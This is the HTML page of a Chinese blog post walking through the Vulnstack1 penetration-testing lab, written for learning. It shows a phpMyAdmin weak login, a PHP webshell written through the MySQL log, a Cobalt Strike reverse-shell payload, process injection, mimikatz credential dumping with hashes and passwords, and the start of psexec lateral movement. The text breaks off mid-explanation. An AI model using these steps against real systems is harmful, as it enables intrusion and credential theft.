@@ -1,0 +1,1006 @@
+
+  <!DOCTYPE html>
+  <html lang="en"  
+    
+      data-theme-mode="auto"
+    
+  >
+  <head>
+  
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_0khxww3tj3q9';window.REIMU_CONFIG.clipboard_tips = {"success":{"en":"复制成功","zh-CN":"复制成功","zh-TW":"複製成功 (*^▽^*)","ja":"コピー成功 (*^▽^*)","pt-BR":"Copiado com sucesso (*^▽^*)"},"fail":{"en":"复制失败","zh-CN":"复制失败","zh-TW":"複製失敗 (ﾟ⊿ﾟ)ﾂ","ja":"コピー失敗 (ﾟ⊿ﾟ)ﾂ","pt-BR":"Falha ao copiar (ﾟ⊿ﾟ)ﾂ"},"copyright":{"enable":false,"count":50,"license_type":"by-nc-sa"}};window.REIMU_CONFIG.clipboard_tips.copyright.content = 'All articles on this blog are licensed under the BY-NC-SA license agreement unless otherwise stated. Please indicate the source when reprinting!';window.REIMU_CONFIG.code_block = {"expand":true};window.REIMU_CONFIG.base = 'http://example.com';</script>
+  
+  <title>
+    Vulnstack内网靶场 |
+    
+    mX1@0_blog
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  
+  
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_0khxww3tj3q9.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="Vulnstack内网靶场Vulnstack1-利用域账号实现权限扩散  环境靶场下载地址：http:&#x2F;&#x2F;vulnstack.qiyuanxuetang.net&#x2F;vuln&#x2F;detail&#x2F;2&#x2F;  vulnstack-win7 对应 Windows 7 ，是Web服务器 vulnstack-Win2K3 Metasploitable 对应 Windows Server 2003 ，是域成员 vulns">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Vulnstack内网靶场">
+<meta property="og:url" content="http://example.com/2026/01/12/vulnstack-nei-wang-ba-chang/index.html">
+<meta property="og:site_name" content="mX1@0_blog">
+<meta property="og:description" content="Vulnstack内网靶场Vulnstack1-利用域账号实现权限扩散  环境靶场下载地址：http:&#x2F;&#x2F;vulnstack.qiyuanxuetang.net&#x2F;vuln&#x2F;detail&#x2F;2&#x2F;  vulnstack-win7 对应 Windows 7 ，是Web服务器 vulnstack-Win2K3 Metasploitable 对应 Windows Server 2003 ，是域成员 vulns">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN/img/3222269-20240619225344256-1474004770.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN/img/kali-2026-01-14-09-27-05.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-01-14%20095132.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-01-14%20103317.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-01-14%20105403.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-01-14%20112216.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-01-14%20142338.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-01-14%20143755.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-01-14%20144204.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-01-14%20230809.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-01-14%20231122.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-01-14%20231811.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-01-14%20232647.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-01-14%20233420.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-01-14%20233634.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-01-14%20233927.png">
+<meta property="og:image" content="https://image.3001.net/images/20250221/1740101680_67b7d83032f74f13fa492.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-01-15%20171026.png">
+<meta property="article:published_time" content="2026-01-12T14:09:55.696Z">
+<meta property="article:modified_time" content="2026-01-20T14:12:43.416Z">
+<meta property="article:author" content="mX1@0">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN/img/3222269-20240619225344256-1474004770.png">
+  
+  
+  
+    <link rel="shortcut icon" href="/images/%E5%9B%BE1.jpg">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" as="style" onload="this.onload&#x3D;null;this.rel&#x3D;&#39;stylesheet&#39;" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" integrity="sha384-IfxC36XL&#x2F;toUyJ939C73PcgMuRzAZuIzZxE38drsmO5p6jD7ei+Zx&#x2F;1oA&#x2F;0l8ysE" crossorigin="anonymous">
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.2/dist/aos.css" integrity="sha384-GMRP93c6Hkz9JVKGAuRR3nTS7M07RwPgTFenXiosjq2VbVgvdDNcz1g6Mkj8AONa" crossorigin="anonymous">
+
+  
+  
+  
+<meta name="generator" content="Hexo 7.3.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+</head>
+
+  <body>
+    
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi rotate">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      
+      
+        
+      
+      <div class="loading-word">加载中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+<div id="heatmap-tooltip"></div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+             
+              &#xe62b;
+             
+          </div>
+          <a class="main-nav-link" href="/">首页</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+             
+              &#xe62b;
+             
+          </div>
+          <a class="main-nav-link" href="/archives">归类</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+             
+              &#xe62b;
+             
+          </div>
+          <a class="main-nav-link" href="/about">关于</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+             
+              &#xe62b;
+             
+          </div>
+          <a class="main-nav-link" href="/friend">友链</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+    
+    
+  </nav>
+  
+</div>
+<header id="header">
+  
+    
+      
+        <picture>
+          
+        </picture>
+        
+          <img  fetchpriority="high" src="/images/%E7%8E%9B%E8%8E%8E%E6%8B%89%E8%92%82.jpg" alt="Vulnstack内网靶场">
+        
+      
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">Vulnstack内网靶场</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content" class="sidebar-left"  >
+          <aside id="sidebar">
+  
+  
+  
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        
+          <div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="mX1@0" class="lazyload">
+  <div class="sidebar-author-name">mX1@0</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Post</div>
+    <div class="sidebar-state-number">74</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Category</div>
+    <div class="sidebar-state-number">26</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tag</div>
+    <div class="sidebar-state-number">69</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+    <div class="icon-twitter sidebar-social-icon">
+      <a href=https://x.com/0xMx1a0 itemprop="url" target="_blank" aria-label="twitter" rel="noopener external nofollow noreferrer"></a>
+    </div>
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归类"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">归类</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          
+            &#xe62b;
+          
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+
+        
+      
+      
+        
+        
+      
+    </div>
+  </div>
+
+  <div class="sidebar-widget">
+  
+  </div>
+  
+</aside>
+
+          <section id="main"><article id="post-Vulnstack内网靶场" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <span class="article-date-link" data-aos="zoom-in">
+    <time datetime="2026-01-12T14:09:55.696Z" itemprop="datePublished">2026-01-12</time>
+    <time style="display: none;" id="post-update-time">2026-01-20</time>
+  </span>
+</div>
+
+      
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <h1 id="Vulnstack内网靶场"><a href="#Vulnstack内网靶场" class="headerlink" title="Vulnstack内网靶场"></a>Vulnstack内网靶场</h1><h2 id="Vulnstack1-利用域账号实现权限扩散"><a href="#Vulnstack1-利用域账号实现权限扩散" class="headerlink" title="Vulnstack1-利用域账号实现权限扩散"></a>Vulnstack1-利用域账号实现权限扩散</h2><img src="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN/img/3222269-20240619225344256-1474004770.png" style="zoom: 33%;">
+
+<h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>靶场下载地址：<a target="_blank" rel="noopener" href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</a></p>
+<ul>
+<li>vulnstack-win7 对应 Windows 7 ，是Web服务器</li>
+<li>vulnstack-Win2K3 Metasploitable 对应 Windows Server 2003 ，是域成员</li>
+<li>vulnstack-winserver08 对应Windows Server 2008，是域控</li>
+<li>kali作为攻击机</li>
+</ul>
+<p>将三台机子的登陆密码设置为相同的，以方便后期对于口令复用的攻击过程</p>
+<p>在Windows 7的C盘下的phpstudy开启web服务</p>
+<h3 id="外围打点"><a href="#外围打点" class="headerlink" title="外围打点"></a>外围打点</h3><h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><p>首先使用nmap扫一下web服务器开放端口，发现开放80、135、3306端口</p>
+<img src="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN/img/kali-2026-01-14-09-27-05.png" style="zoom:67%;">
+
+<p>网页访问80端口，发现是php探针页面</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-01-14%20095132.png"></p>
+<p>并且该页面下方还提供了mysql数据库连接测试，由于已经知道该站点使用了phpstudy套件，该套件中mysql对应的root用户默认密码为root，尝试连接之后发现是成功的</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-01-14%20103317.png"></p>
+<p>由于开启了3306端口，可以尝试直接连接mysql数据库</p>
+<h4 id="phpmyadmin日志getshell"><a href="#phpmyadmin日志getshell" class="headerlink" title="phpmyadmin日志getshell"></a>phpmyadmin日志getshell</h4><p>对web服务器进行目录扫描，发现phpmyadmin平台，尝试弱口令，root/root成功登录</p>
+<p>查看日志功能开启情况及存放位置</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like "general_log%";</span><br></pre></td></tr></tbody></table></figure>
+
+<p>结果如下表</p>
+<table>
+<thead>
+<tr>
+<th align="center">variable_name</th>
+<th align="center">value</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">general_log</td>
+<td align="center">OFF</td>
+</tr>
+<tr>
+<td align="center">general_log_file</td>
+<td align="center">C:\phpStudy\MySQL\data\stu1.log</td>
+</tr>
+</tbody></table>
+<p>现在要做的就是开启全局日志功能以及更改日志文件的目录，以方便后续对webshell的写入</p>
+<p>开启日志功能：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global general_log = 'on';</span><br></pre></td></tr></tbody></table></figure>
+
+<p>更改日志文件目录：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global general_log_file = "C:\\phpStudy\\WWW\\shell.php"</span><br></pre></td></tr></tbody></table></figure>
+
+<p>为了写入日志的恶意内容能被访问，所以将日志文件位置改为Web服务访问的目录WWW，并且创建一个shell.php的文件来取代日志文件</p>
+<p>现在再执行就可以看到配置已经改变</p>
+<img src="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-01-14%20105403.png" style="zoom: 80%;">
+
+<p>写入恶意代码到shell.php这个日志文件中</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select "&lt;?php system($_REQUEST[cmd]);?&gt;";</span><br></pre></td></tr></tbody></table></figure>
+
+<p>执行完成后就可以进行命令执行了<code>/shell.php?cmd=whoami</code></p>
+<h3 id="CS上线"><a href="#CS上线" class="headerlink" title="CS上线"></a>CS上线</h3><p>在Cobalt Strike（CS）中生成反弹shell的payload</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Attacks -&gt; Packages -&gt; Payload Generator</span><br></pre></td></tr></tbody></table></figure>
+
+<p>选择<code>PowerShell Command</code>，然后会生成一个payload.txt文件内容开头为<code>powershell -nop -w hidden -encodedcommand</code>，完整复制并在<code>cmd=</code>之后进行访问，就会在CS上线一个来自目标主机的Beacon反弹shell连接</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-01-14%20112216.png"></p>
+<p>在该条记录中右键选择interact可以与反弹shell终端进行交互</p>
+<p>默认是60s进行一次交互，在交互界面输入以下命令将其改为实时交互</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sleep 0</span><br></pre></td></tr></tbody></table></figure>
+
+<p>与反弹shell终端进行命令交互，需要使用以下命令</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell + 命令名称</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>根据上述记录可以看到arch的值为x86，也就是获得了一个32位的shell进程，但是使用systeminfo查看得知该服务器为64位系统，所以还需要获取一个64位反弹shell连接</p>
+<p>此处做一个说明，为什么一定需要获取一个64位反弹shell连接</p>
+<blockquote>
+<ol>
+<li>系统调用与API的兼容性问题，<ul>
+<li>32位进程只能调用32位API，某些关键的、只在64位内核/API中提供的功能无法使用</li>
+</ul>
+</li>
+<li>进程注入与迁移的关键障碍<ul>
+<li><strong>“位宽”必须匹配</strong>：当你尝试将攻击载荷注入到另一个进程时，<strong>注入载荷的架构必须与目标进程的架构完全一致</strong>。</li>
+<li><strong>主流服务进程多为64位</strong>：在64位服务器上，关键的系统服务（如<code>lsass.exe</code>、<code>svchost.exe</code>、<code>explorer.exe</code>）、杀软进程、甚至浏览器，绝大多数都是64位的。</li>
+</ul>
+</li>
+<li>工具链与依赖库的兼容性<ul>
+<li><strong>渗透测试工具多为64位编译</strong>：像Mimikatz、PowerSploit模块、各种提权漏洞的EXP，通常都发布为64位版本，以利用完整的系统能力。</li>
+<li><strong>在32位shell中运行64位工具会崩溃</strong>：操作系统会拒绝执行架构不匹配的二进制文件。虽然部分工具提供32位编译版，但其在WoW64环境下运行可能不稳定或功能受限。</li>
+</ul>
+</li>
+</ol>
+</blockquote>
+<p>查看目标主机本地进程列表</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell tasklist</span><br></pre></td></tr></tbody></table></figure>
+
+<ul>
+<li>被注入的目标进程，优先选择非系统进程，防止系统崩溃</li>
+</ul>
+<p>发现有everything与phpstudy进程，操作phpstudy可能造成web服务无法访问，所以选择everything进程进行注入</p>
+<p>在交互终端输入</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">inject 1720(everything的进程ID) x64</span><br></pre></td></tr></tbody></table></figure>
+
+<p>执行 <code>inject</code> 命令向一个 64 位进程（PID 1720）注入 payload</p>
+<p>弹出窗口选择一个本地监听器即可，然后就获得了由everything进程派生的64位shell反弹shell，这意味着进程注入成功</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-01-14%20142338.png"></p>
+<p>然后当前为Administrator用户权限，直接输入<code>getsystem</code>命令将权限提升到SYSTEM权限</p>
+<h3 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h3><h4 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h4><p>查看内网域用户信息</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-01-14%20143755.png"></p>
+<ul>
+<li>PDC（Primary Domain Controller）这一台是域控主机</li>
+</ul>
+<p>CS的Beacon反弹shell自带mimikatz，所以直接输入以下命令实现对目标主机本地密码和哈希的读取</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logonpasswords</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-01-14%20144204.png"></p>
+<p>直接获取到目标主机的明文密码</p>
+<p>对mimikatz得到的内容做一个扩展</p>
+<blockquote>
+<ol>
+<li><code>msv</code> (MSV1_0 认证包)</li>
+</ol>
+<p>这是 Windows 的主要本地认证模块。这里显示了用户的密码哈希：</p>
+<ul>
+<li><strong>LM Hash</strong>: <code>edea194d76c77d87923b4276177762ae</code> （较旧、较弱，已基本淘汰，此处可能是历史值）</li>
+<li><strong>NTLM Hash</strong>: <code>8c535a2d84c3b21059d667639bb89db5</code><ul>
+<li><strong>这是最重要的攻击凭据</strong>，可用于“哈希传递”攻击，直接横向移动到其他服务器，无需破解密码。</li>
+<li>可用于在本地或远程破解（如用 hashcat），尝试还原出明文密码。</li>
+</ul>
+</li>
+<li><strong>SHA1</strong>: 另一种哈希形式，在 Windows 环境中不如 NTLM 常用。</li>
+</ul>
+<p><strong>2. <code>tspkg</code> (Terminal Services 包)</strong></p>
+<p>这是用于 <strong>远程桌面 (RDP)</strong> 认证的组件。</p>
+<ul>
+<li><strong>关键点</strong>：它直接显示了 <strong>明文密码</strong>：<code>hongrisec@2022</code></li>
+<li>这说明服务器可能启用了“将凭据存储在内存中”的策略，或者用户通过RDP登录后未注销。</li>
+</ul>
+<p><strong>3. <code>wdigest</code></strong></p>
+<p>这是较旧的身份验证协议，Windows 默认会将其凭据（<strong>包括明文密码</strong>）保留在内存中。</p>
+<ul>
+<li>同样显示了 <strong>明文密码</strong>：<code>hongrisec@2022</code></li>
+<li>这是获取明文密码最常见的来源。</li>
+</ul>
+<p><strong>4. <code>kerberos</code></strong></p>
+<p>这是用于 <strong>域环境（Active Directory）</strong> 网络认证的协议。</p>
+<ul>
+<li>显示了用户的 <strong>Principal Name</strong> (<code>Administrator@GOD.ORG</code>) 和同样的 <strong>明文密码</strong>。</li>
+<li>此凭据可用于请求 Kerberos 票证（如黄金票证），在域内进行横向移动和权限维持。</li>
+</ul>
+<p><strong>5. <code>ssp</code> &amp; <code>credman</code></strong></p>
+<ul>
+<li>**<code>ssp</code> (Security Support Provider)**：此处为空，表示没有通过其他安全支持提供程序保存的凭据。</li>
+<li>**<code>credman</code> (Credential Manager)**：此处为空，表示Windows凭据管理器中没有存储的网络或网站凭据。</li>
+</ul>
+</blockquote>
+<h4 id="横向移动-1"><a href="#横向移动-1" class="headerlink" title="横向移动"></a>横向移动</h4><p>借助已获得的域用户的账户密码，尝试进行口令复用</p>
+<p>使用psexec建立IPC通道，上线域控</p>
+<blockquote>
+<p><strong>PsExec</strong> 是微软官方 <strong>Sysinternals</strong> 工具集中的一个强大命令行工具，它允许管理员<strong>在远程 Windows 系统上执行程序</strong>，并与其进行完整的交互（就像在本地运行一样）</p>
+<p>工作原理（简化的技术流程）</p>
+<ol>
+<li><strong>建立连接</strong>：通过 <strong>SMB</strong> 协议（445端口）连接到目标的 <code>ADMIN$</code> 共享（默认的系统管理共享）。</li>
+<li><strong>上传服务</strong>：将 <code>PsExec</code> 的一个小服务端组件 (<code>PSEXESVC.exe</code>) 复制到目标的 <code>C:\Windows</code> 目录。</li>
+<li><strong>创建服务</strong>：通过 <strong>服务控制管理器</strong> 在目标系统上创建一个 Windows 服务来运行该程序。</li>
+<li><strong>执行命令</strong>：服务启动，执行你指定的命令，并将输入/输出通过网络管道传回本地。</li>
+<li><strong>清理</strong>：命令执行完毕后，服务被删除（除非使用 <code>-d</code> 参数不等待）。</li>
+</ol>
+</blockquote>
+<p>在CS中可以很容易使用psexec，只需要在Targets标签中找到希望连接的目标主机，按照以下流程</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Jump -&gt; psexec</span><br></pre></td></tr></tbody></table></figure>
+
+<p>如果目标主机系统为64位，则选择<code>psexec64</code></p>
+<img src="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-01-14%20230809.png" style="zoom: 67%;">
+
+<p>在弹出页面中选择我们刚才获得的Administrator域用户的用户名及密码作为控制凭证，同时需要新建一个SMB协议的监听器，并且选择x64对应的session会话作为发起该操作的会话</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xmhhmx/PicGoCDN/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-01-14%20231122.png"></p>
+<blockquote>
+<p><strong>SMB协议在此处是PsExec实现远程命令执行的“基石”和“运输通道”</strong>。它负责完成<strong>认证、文件传输和进程间通信</strong>三大核心功能。</p>
+<ol>
+<li>身份认证（Authentication）**</li>
+</ol>
+<ul>
+<li><strong>当执行 <code>psexec \\目标IP ...</code> 时</strong>，PsExec首先通过SMB协议向目标的445端口发起连接。</li>
+<li><strong>SMB协商和认证</strong>：它会使用你提供的用户名/密码（或当前会话凭据）进行SMB认证。如果认证失败，整个过程立即终止。</li>
+<li><strong>关键点</strong>：这就是为什么你需要域管理员/本地管理员凭据才能使用PsExec的原因——SMB协议要求具备访问<code>ADMIN$</code>管理共享的权限。</li>
+</ul>
+<ol start="2">
+<li>文件传输（File Transfer - 上传服务组件）**</li>
+</ol>
+<ul>
+<li><p><strong>PsExec的核心机制</strong>：它并不是一个纯粹的“远程执行协议”，而是一个<strong>通过上传并安装临时服务来实现远程执行的工具</strong>。</p>
+</li>
+<li><p><strong>上传PSEXESVC.exe</strong>：</p>
+<ol>
+<li>认证成功后，PsExec通过SMB协议访问目标的<code>ADMIN$</code>共享（该共享映射到<code>C:\Windows\</code>目录）。</li>
